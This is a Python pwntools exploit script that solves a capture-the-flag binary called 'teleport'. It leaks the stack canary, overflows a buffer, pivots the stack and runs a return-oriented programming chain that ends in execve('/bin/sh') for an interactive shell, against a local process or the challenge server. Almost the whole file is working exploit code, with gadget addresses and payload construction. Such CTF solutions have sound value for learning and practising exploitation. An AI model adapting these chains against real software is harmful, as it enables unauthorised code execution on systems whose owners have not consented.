#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from os import path
import sys

# ==========================[ Information
DIR = path.dirname(path.abspath(__file__))
EXECUTABLE = "/teleport"
TARGET = DIR + EXECUTABLE 
HOST, PORT = "ctf.tcp1p.com", 1470
REMOTE, LOCAL = False, False

# ==========================[ Tools
elf = ELF(TARGET)
elfROP = ROP(elf)

# ==========================[ Configuration
context.update(
    arch=["i386", "amd64", "aarch64"][1],
    endian="little",
    os="linux",
    log_level = ['debug', 'info', 'warn'][2],
    terminal = ['tmux', 'split-window', '-h'],
)

# ==========================[ Exploit

def exploit(io, libc=null):
    if LOCAL==True:
        #raw_input("Fire GDB!")
        if len(sys.argv) > 1 and sys.argv[1] == "d":
            choosen_gdb = [
                "source /home/mydata/tools/gdb/gdb-pwndbg/gdbinit.py",     # 0 - pwndbg
                "source /home/mydata/tools/gdb/gdb-peda/peda.py",          # 1 - peda
                "source /home/mydata/tools/gdb/gdb-gef/.gdbinit-gef.py"    # 2 - gef
                ][0]
            cmd = choosen_gdb + """
            b *cool_thing2+0x70
            b *cool_thing2+0xc7
            b *cool_thing2+225
            """
            gdb.attach(io, gdbscript=cmd)

    POP_RAX_RDX_RBX = 0x00000000004a3dca # : pop rax ; pop rdx ; pop rbx ; ret
    POP_RDX_RBX = 0x00000000004accc0 # : pop rdx ; pop rbx ; ret
    POP_RDI = 0x000000000040251f # : pop rdi ; ret
    POP_RSI = 0x000000000040a58e # : pop rsi ; ret
    LEAVE_RET = 0x0000000000401c6b # : leave ; ret
    SYSCALL_RET = 0x422ea6 

    # cool_things1
    io.sendlineafter(b"> ", f"{0xFFFF_FFFF_deadbeef} {0xFEFF_FFFF_deadbeef}".encode())

    """
    .text:0000000000401D23                 lea     rax, [rbp-0x30] <-- cool_thing+0xb6
    .text:0000000000401D27                 mov     edx, 0x40
    .text:0000000000401D2C                 mov     rsi, rax
    .text:0000000000401D2F                 mov     edi, 0
    .text:0000000000401D34                 call    read
    """
    p = b""
    p += p64(elf.symbols["anu"]+0x38) # will be pointing to our saved RIP (after stack pivoting)
    p += p64(elf.symbols["cool_thing2"]+0xb6)
    io.sendafter(b"?\n", p)
    
    # cool_things2
    io.sendlineafter(b"> ", f"{0xffff_ffff} {0xbf80_0000}".encode())
    
    # cool_things3
    io.sendlineafter(b"> ", f"{0.1} {0.2}".encode())

    io.recvuntil(b"need it...\n")
    STACK_CANARY = int(io.recvuntil(b"\n", drop=True).decode()) & 0xFF_FF_FF_FF_FF_FF_FF_FF
    print("STACK_CANARY                 :", hex(STACK_CANARY), STACK_CANARY )
    p = b""
    p += b"A"*8
    io.send(p)
    sleep(0.1)

    p = b""
    p += b"A"*0x28
    p += p64(STACK_CANARY)
    p += p64(elf.symbols["anu"])
    p += p64(LEAVE_RET)
    io.sendafter(b"?\n", p)

    # Register overwrite before executing this ROP
    # $rax = 0x40
    # $rdi = 0
    # $rsi = &anu+8
    # $rdx = &anu+8
    p = b""
    p += p64(POP_RAX_RDX_RBX) # rip
    p += p64(0) 
    p += p64(0x300)
    p += p64(0)
    p += p64(SYSCALL_RET)
    p = p.ljust(64, b"A")
    # Register overwrite before executing this ROP
    # $rax = 0
    # $rdi = 0
    # $rsi = &anu+8
    # $rdx = 0x300
    io.send(p)

    sleep(1)

    # sys_execve('/bin/sh', NULL, NULL)
    p = b""
    p += b"/bin/sh\x00" # anu+8
    p += p64(SYSCALL_RET+2)*50 # retsled: "syscall; ret;" +2 == "ret"
    p += p64(POP_RAX_RDX_RBX)
    p += p64(0x3b)
    p += p64(0)
    p += p64(0)
    p += p64(POP_RDI)
    p += p64(elf.symbols["anu"]+8) # "/bin/sh"
    p += p64(POP_RSI)
    p += p64(0)
    p += p64(SYSCALL_RET)
    io.send(p)
    io.interactive()

if __name__ == "__main__":
    io, libc = null, null

    if args.REMOTE:
        REMOTE = True
        io = remote(HOST, PORT)
        # libc = ELF("___")
        
    else:
        LOCAL = True
        io = process(
            [TARGET, ],
            env={
            #     "LD_PRELOAD":DIR+"/___",
            #     "LD_LIBRARY_PATH":DIR+"/___",
            },
        )
        # libc = ELF("___")
    exploit(io, libc)
